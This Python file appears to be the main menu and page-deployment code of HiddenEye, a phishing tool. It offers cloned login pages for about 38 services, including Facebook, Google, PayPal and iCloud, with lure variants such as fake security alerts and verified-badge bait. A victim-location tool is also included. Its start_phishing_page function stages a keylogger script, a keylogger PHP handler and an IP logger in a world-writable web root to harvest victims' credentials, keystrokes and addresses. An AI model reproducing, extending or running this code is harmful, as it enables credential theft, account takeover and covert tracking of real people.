from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import webpage_set
from Defs.ImportManager.unsorted_will_be_replaced import wait
from Defs.ThemeManager.theme import default_palette
from Defs.ActionManager.informant import exit_message, port_selector, module_loading_message


def start_main_menu():
    run_command('clear')
    with open('version.txt') as f:
        ver_current = f.read()
        version = ver_current.strip()
    print('''

 {1} ██   ██ ██ ██████   ██████   ███████ ███   ██  {2}███████ ██    ██ ███████ {0}
 {1} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {2}██       ██  ██  ██      {0}
 {1} ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {2}███████   ████   ███████ {0}
 {1} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {2}██         ██    ██      {0}
 {1} ██   ██ ██ ██████   ██████   ███████ ██   ███  {2}███████    ██    ███████ {0}
                                                      {2}[{0}v {3}{2}]{0} BY:DARKSEC{1}
             {2}[{1} Modern Phishing Tool With Advanced Functionality {2}]
{2}[{1} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {2}]
________________________________________________________________________________'''.format(default_palette[4], default_palette[2], default_palette[0], version))
    print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------")
    print("\n{0}PHISHING-MODULES:".format(default_palette[0]))
    print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(default_palette[0], default_palette[2]))
    print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
        default_palette[0], default_palette[2]))
    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
        default_palette[0], default_palette[2]))
    print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(default_palette[0]))
    print(" {0}[{1}A{0}]{1} Get Victim Location".format(default_palette[0], default_palette[2]))

    option = input("\n{0}HiddenEye >>>  {1}".format(default_palette[0], default_palette[2]))
    if option == '1' or option == '01':
        module_loading_message('Facebook')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        start_phishing_page('Facebook', customOption)
    elif option == '2' or option == '02':
        module_loading_message('Google')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        start_phishing_page('Google', customOption)
    elif option == '3' or option == '03':
        module_loading_message('LinkedIn')
        customOption = ''
        start_phishing_page('LinkedIn', customOption)
    elif option == '4' or option == '04':
        module_loading_message('GitHub')
        customOption = ''
        start_phishing_page('GitHub', customOption)
    elif option == '5' or option == '05':
        module_loading_message('StackOverflow')
        customOption = ''
        start_phishing_page('StackOverflow', customOption)
    elif option == '6' or option == '06':
        module_loading_message('WordPress')
        customOption = ''
        start_phishing_page('WordPress', customOption)
    elif option == '7' or option == '07':
        module_loading_message('Twitter')
        customOption = ''
        start_phishing_page('Twitter', customOption)
    elif option == '8' or option == '08':
        module_loading_message('Instagram')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        start_phishing_page('Instagram', customOption)
    elif option == '9' or option == '09':
        module_loading_message('Snapchat')
        customOption = ''
        start_phishing_page('Snapchat', customOption)
    elif option == '10':
        module_loading_message('Yahoo')
        customOption = ''
        start_phishing_page('Yahoo', customOption)
    elif option == '11':
        module_loading_message('Twitch')
        customOption = ''
        start_phishing_page('Twitch', customOption)
    elif option == '12':
        module_loading_message('Microsoft')
        customOption = ''
        start_phishing_page('Microsoft', customOption)
    elif option == '13':
        module_loading_message('Steam')
        customOption = ''
        start_phishing_page('Steam', customOption)
    elif option == '14':
        module_loading_message('VK')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(default_palette[0], default_palette[4], default_palette[2]))
        start_phishing_page('VK', customOption)
    elif option == '15':
        module_loading_message('iCloud')
        customOption = ''
        start_phishing_page('iCloud', customOption)
    elif option == '16':
        module_loading_message('GitLab')
        customOption = ''
        start_phishing_page('GitLab', customOption)
    elif option == '17':
        module_loading_message('NetFlix')
        customOption = ''
        start_phishing_page('NetFlix', customOption)
    elif option == '18':
        module_loading_message('Origin')
        customOption = ''
        start_phishing_page('Origin', customOption)
    elif option == '19':
        module_loading_message('Pinterest')
        customOption = ''
        start_phishing_page('Pinterest', customOption)
    elif option == '20':
        module_loading_message('ProtonMail')
        customOption = ''
        start_phishing_page('ProtonMail', customOption)
    elif option == '21':
        module_loading_message('Spotify')
        customOption = ''
        start_phishing_page('Spotify', customOption)
    elif option == '22':
        module_loading_message('Quora')
        customOption = ''
        start_phishing_page('Quora', customOption)
    elif option == '23':
        module_loading_message('PornHub')
        customOption = ''
        start_phishing_page('PornHub', customOption)
    elif option == '24':
        module_loading_message('Adobe')
        customOption = ''
        start_phishing_page('Adobe', customOption)
    elif option == '25':
        module_loading_message('Badoo')
        customOption = ''
        start_phishing_page('Badoo', customOption)
    elif option == '26':
        module_loading_message('CryptoCurrency')
        customOption = ''
        start_phishing_page('CryptoCurrency', customOption)
    elif option == '27':
        module_loading_message('DevianArt')
        customOption = ''
        start_phishing_page('DevianArt', customOption)
    elif option == '28':
        module_loading_message('DropBox')
        customOption = ''
        start_phishing_page('DropBox', customOption)
    elif option == '29':
        module_loading_message('eBay')
        customOption = ''
        start_phishing_page('eBay', customOption)
    elif option == '30':
        module_loading_message('MySpace')
        customOption = ''
        start_phishing_page('Myspace', customOption)
    elif option == '31':
        module_loading_message('PayPal')
        customOption = ''
        start_phishing_page('PayPal', customOption)
    elif option == '32':
        module_loading_message('Shopify')
        customOption = ''
        start_phishing_page('Shopify', customOption)
    elif option == '33':
        module_loading_message('Verizon')
        customOption = ''
        start_phishing_page('Verizon', customOption)
    elif option == '34':
        module_loading_message('Yandex')
        customOption = ''
        start_phishing_page('Yandex', customOption)
    elif option == '35':
        module_loading_message('Reddit')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        start_phishing_page('Reddit', customOption)
    elif option == '36':
        module_loading_message('Subitoit')
        customOption = ''
        start_phishing_page('Subitoit', customOption)
    elif option == '37':
        module_loading_message('PlayStation')
        customOption = ''
        start_phishing_page('PlayStation', customOption)
    elif option == '38':
        module_loading_message('Xbox')
        customOption = ''
        start_phishing_page('Xbox', customOption)
    elif option == '39':
        module_loading_message('CUSTOM(1)')
        customOption = ''
        start_phishing_page('CUSTOM(1)', customOption)
    elif option == '40':
        module_loading_message('CUSTOM(2)')
        customOption = ''
        start_phishing_page('CUSTOM(2)', customOption)
    
    #Below Are Tools And Above Are Phishing Modules..

    elif option == 'A' or option == 'a':
        module_loading_message('LOCATION')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        start_phishing_page('LOCATION', customOption)

    else:
        exit_message(port)


def start_phishing_page(page, custom_option):  # Phishing pages selection menu
    run_command('cd Server && mkdir www && chmod 777 Server -R')
    run_command('rm -r Server/www/ && mkdir Server/www')
    run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
    run_command('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
    if custom_option == '1' and page == 'Facebook':
        webpage_set("WebPages/fb_standard/", "Server/www/")
    elif custom_option == '2' and page == 'Facebook':
        webpage_set("WebPages/fb_advanced_poll/", "Server/www/")
    elif custom_option == '3' and page == 'Facebook':
        webpage_set("WebPages/fb_security_fake/", "Server/www/")
    elif custom_option == '4' and page == 'Facebook':
        webpage_set("WebPages/fb_messenger/", "Server/www/")
    elif custom_option == '1' and page == 'Google':
        webpage_set("WebPages/google_standard/", "Server/www/")
    elif custom_option == '2' and page == 'Google':
        webpage_set("WebPages/google_advanced_poll/", "Server/www/")
    elif custom_option == '3' and page == 'Google':
        webpage_set("WebPages/google_advanced_web/", "Server/www/")
    elif page == 'LinkedIn':
        webpage_set("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        webpage_set("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        webpage_set("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        webpage_set("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        webpage_set("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        webpage_set("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        webpage_set("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        webpage_set("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        webpage_set("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        webpage_set("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        webpage_set("WebPages/iCloud/", "Server/www/")
    elif custom_option == '1' and page == 'Instagram':
        webpage_set("WebPages/Instagram_web/", "Server/www/")
    elif custom_option == '2' and page == 'Instagram':
        webpage_set("WebPages/Instagram_autoliker/", "Server/www/")
    elif custom_option == '3' and page == 'Instagram':
        webpage_set("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif custom_option == '4' and page == 'Instagram':
        webpage_set("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif custom_option == '5' and page == 'Instagram':
        webpage_set("WebPages/instafollowers/", "Server/www/")
    elif custom_option == '1' and page == 'VK':
        webpage_set("WebPages/VK/", "Server/www/")
    elif custom_option == '2' and page == 'VK':
        webpage_set("WebPages/VK_poll_method/", "Server/www/")
    elif page == 'GitLab':
        webpage_set("WebPages/gitlab/", "Server/www/")
    elif page == 'NetFlix':
        webpage_set("WebPages/netflix/", "Server/www/")
    elif page == 'Origin':
        webpage_set("WebPages/origin/", "Server/www/")
    elif page == 'Pinterest':
        webpage_set("WebPages/pinterest/", "Server/www/")
    elif page == 'ProtonMail':
        webpage_set("WebPages/protonmail/", "Server/www/")
    elif page == 'Spotify':
        webpage_set("WebPages/spotify/", "Server/www/")
    elif page == 'Quora':
        webpage_set("WebPages/quora/", "Server/www/")
    elif page == 'PornHub':
        webpage_set("WebPages/pornhub/", "Server/www/")
    elif page == 'Adobe':
        webpage_set("WebPages/adobe/", "Server/www/")
    elif page == 'Badoo':
        webpage_set("WebPages/badoo/", "Server/www/")
    elif page == 'CryptoCurrency':
        webpage_set("WebPages/cryptocurrency/", "Server/www/")
    elif page == 'DevianArt':
        webpage_set("WebPages/devianart/", "Server/www/")
    elif page == 'DropBox':
        webpage_set("WebPages/dropbox/", "Server/www/")
    elif page == 'eBay':
        webpage_set("WebPages/ebay/", "Server/www/")
    elif page == 'Myspace':
        webpage_set("WebPages/myspace/", "Server/www/")
    elif page == 'PayPal':
        webpage_set("WebPages/paypal/", "Server/www/")
    elif page == 'Shopify':
        webpage_set("WebPages/shopify/", "Server/www/")
    elif page == 'Verizon':
        webpage_set("WebPages/verizon/", "Server/www/")
    elif page == 'Yandex':
        webpage_set("WebPages/yandex/", "Server/www/")
    elif custom_option == '1' and page == 'Reddit':
        webpage_set("WebPages/Reddit/", "Server/www/")
    elif custom_option == '2' and page == 'Reddit':
        webpage_set("WebPages/Reddit-old/", "Server/www/")
    elif page == 'Subitoit':
        webpage_set("WebPages/subitoit/", "Server/www/")
    elif page == 'PlayStation':
        webpage_set('WebPages/playstation/', "Server/www/")
    elif page == 'Xbox':
        webpage_set('WebPages/xbox/', "Server/www/")
    elif page == 'CUSTOM(1)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(default_palette[0], default_palette[4]))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
        wait(3)
        webpage_set('WebPages/CUSTOM(1)/', "Server/www/")
    elif page == 'CUSTOM(2)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(default_palette[0], default_palette[4]))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(default_palette[0], default_palette[4]))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(default_palette[0], default_palette[4]))
        wait(3)
        webpage_set('WebPages/CUSTOM(2)/', "Server/www/")
    

    # Tools Below && Phishing Pages Above
    elif custom_option == '1' and page == 'LOCATION':
        wait(3)
        webpage_set('WebPages/TOOLS/nearyou', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n".format(default_palette[0], default_palette[4]))
        input('\nPress Enter To continue...')
    elif custom_option == '2' and page == 'LOCATION':
        wait(3)
        webpage_set('WebPages/TOOLS/gdrive', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(default_palette[0], default_palette[4]))
        input('\nPress Enter To continue...')

    else:
        exit_message(port)